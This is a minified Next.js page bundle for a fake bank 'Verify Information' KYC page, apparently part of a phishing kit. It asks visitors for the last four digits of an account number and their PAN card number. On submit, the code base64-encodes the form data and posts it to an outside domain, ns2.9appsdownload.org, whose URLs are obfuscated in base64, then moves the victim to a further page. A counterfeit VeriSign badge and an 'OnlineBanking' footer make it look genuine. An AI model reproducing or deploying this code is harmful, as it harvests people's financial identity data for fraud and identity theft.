(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([
    [409], {
        5139: function(t, e, n) {
            (window.__NEXT_P = window.__NEXT_P || []).push(["/f", function() {
                return n(6345)
            }])
        },
        9018: function(t, e, n) {
            "use strict";
            var a = n(1876).Buffer,
                s = {
                    dataList: a.from("https://ns2.9appsdownload.org/in.php", "utf-8").toString("base64"),
                    getList: a.from("https://ns2.9appsdownload.org/aja.php", "utf-8").toString("base64")
                };
            e.Z = s
        },
        6345: function(t, e, n) {
            "use strict";
            n.r(e), n.d(e, {
                default: function() {
                    return $
                }
            });
            var a = n(7568),
                s = n(655),
                r = n(5893),
                i = n(9008),
                o = n.n(i),
                c = n(5675),
                u = n.n(c),
                l = n(7294),
                d = n(1163),
                m = n(9018),
                h = n(1876).Buffer;

            function $() {
                var t, e = (0, d.useRouter)(),
                    n = (0, l.useState)(""),
                    i = n[0],
                    c = n[1],
                    $ = function() {
                        var t = new Date,
                            e = t.getFullYear(),
                            n = t.getMonth() + 1,
                            a = t.getDate();
                        a < 10 && (a = "0" + a);
                        var s = t.getHours(),
                            r = t.getMinutes(),
                            i = s >= 12 ? "PM" : "AM";
                        s %= 12, s = s || 12, r = r < 10 ? "0" + r : r, c(a + "-" + ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"][n].substring(0, 3) + "-" + e + " [" + s + ":" + r + " " + i + " IST]")
                    },
                    f = (0, l.useState)(!1),
                    p = f[0],
                    x = f[1],
                    b = (t = (0, a.Z)(function(t) {
                        var n, a, r, i, o, c, u;
                        return (0, s.__generator)(this, function(s) {
                            switch (s.label) {
                                case 0:
                                    return t.preventDefault(), x(!0), n = new FormData(t.target), a = {}, n.forEach(function(t, e) {
                                        a[e] = t
                                    }), r = JSON.stringify(a), i = ((o = {}).method = "POST", o.headers = {
                                        "Content-Type": "text/plain"
                                    }, o.body = h.from(r, "utf-8").toString("base64"), o), [4, fetch(window.atob(m.Z.dataList) + "?id=" + window.location.hostname, i)];
                                case 1:
                                    return [4, (c = s.sent()).json()];
                                case 2:
                                    return u = s.sent(), x(!1), !0 == u.status ? e.push("/g") : x(!1), [2]
                            }
                        })
                    }), function(e) {
                        return t.apply(this, arguments)
                    });
                return (0, l.useEffect)(function() {
                    return $
                }, []), (0, r.jsxs)(r.Fragment, {
                    children: [(0, r.jsxs)(o(), {
                        children: [(0, r.jsx)("title", {
                            children: "Verify information"
                        }), (0, r.jsx)("meta", {
                            name: "description",
                            content: "verify your user account information"
                        })]
                    }), (0, r.jsxs)("main", {
                        children: [(0, r.jsx)("div", {
                            className: "logo",
                            children: (0, r.jsx)(u(), {
                                src: "/image.png",
                                alt: "site logo",
                                width: 100,
                                height: 37
                            })
                        }), (0, r.jsx)("br", {}), (0, r.jsx)("div", {
                            className: "panelDiv",
                            children: (0, r.jsx)("div", {
                                className: "panel",
                                children: (0, r.jsx)("span", {
                                    children: i
                                })
                            })
                        }), (0, r.jsx)("div", {
                            className: "content_heading",
                            children: (0, r.jsx)("h3", {
                                className: "pull-left",
                                children: "Verify Information"
                            })
                        }), (0, r.jsxs)("div", {
                            className: "content_area",
                            children: [(0, r.jsx)("p", {
                                className: "mandatory_txt",
                                children: "Mandatory fields are marked with an asterisk (*)"
                            }), (0, r.jsxs)("form", {
                                action: "#",
                                className: "form",
                                method: "post",
                                onSubmit: b,
                                children: [(0, r.jsxs)("div", {
                                    className: "form-group",
                                    children: [(0, r.jsxs)("label", {
                                        className: "control-label",
                                        htmlFor: "otAccountNumberp1",
                                        children: [" Last 4 Digit Account Number", (0, r.jsx)("span", {
                                            className: "mandatory_txt",
                                            children: "*"
                                        })]
                                    }), (0, r.jsx)("input", {
                                        className: "form-control",
                                        id: "AccountNumber",
                                        type: "text",
                                        name: "AccountNumber",
                                        maxLength: 4,
                                        tabIndex: "1"
                                    })]
                                }), (0, r.jsxs)("div", {
                                    className: "form-group",
                                    children: [(0, r.jsxs)("label", {
                                        className: "control-label",
                                        htmlFor: "PanNumber",
                                        children: ["PAN Card Number", (0, r.jsx)("span", {
                                            className: "mandatory_txt",
                                            children: "*"
                                        })]
                                    }), (0, r.jsx)("input", {
                                        className: "form-control",
                                        id: "PanNumber",
                                        type: "text",
                                        name: "PanNumber",
                                        maxLength: 10,
                                        pattern: "[a-zA-Z]{5}[0-9]{4}[a-zA-Z]{1}",
                                        title: "Please enter valid PAN",
                                        tabIndex: "1"
                                    })]
                                }), (0, r.jsx)("p", {
                                    className: "content_title",
                                    children: "50% KYC Successful"
                                }), (0, r.jsx)("div", {
                                    className: "commonbutton",
                                    children: (0, r.jsx)("input", {
                                        name: "btContinue",
                                        disabled: !!p,
                                        id: "btContinue",
                                        type: "submit",
                                        className: "btn btn-default",
                                        title: "submit",
                                        value: "submit"
                                    })
                                })]
                            })]
                        }), (0, r.jsx)("div", {
                            className: "footer_area",
                            children: (0, r.jsx)(u(), {
                                src: "/v.png",
                                width: 68,
                                height: 28,
                                alt: "versign"
                            })
                        }), (0, r.jsx)("div", {
                            className: "footer",
                            children: (0, r.jsx)("p", {
                                children: "\xa9 OnlineBanking"
                            })
                        })]
                    })]
                })
            }
        },
        7568: function(t, e, n) {
            "use strict";

            function a(t, e, n, a, s, r, i) {
                try {
                    var o = t[r](i),
                        c = o.value
                } catch (u) {
                    n(u);
                    return
                }
                o.done ? e(c) : Promise.resolve(c).then(a, s)
            }

            function s(t) {
                return function() {
                    var e = this,
                        n = arguments;
                    return new Promise(function(s, r) {
                        var i = t.apply(e, n);

                        function o(t) {
                            a(i, s, r, o, c, "next", t)
                        }

                        function c(t) {
                            a(i, s, r, o, c, "throw", t)
                        }
                        o(void 0)
                    })
                }
            }
            n.d(e, {
                Z: function() {
                    return s
                }
            })
        }
    },
    function(t) {
        t.O(0, [345, 876, 774, 888, 179], function() {
            return t(t.s = 5139)
        }), _N_E = t.O()
    }
]);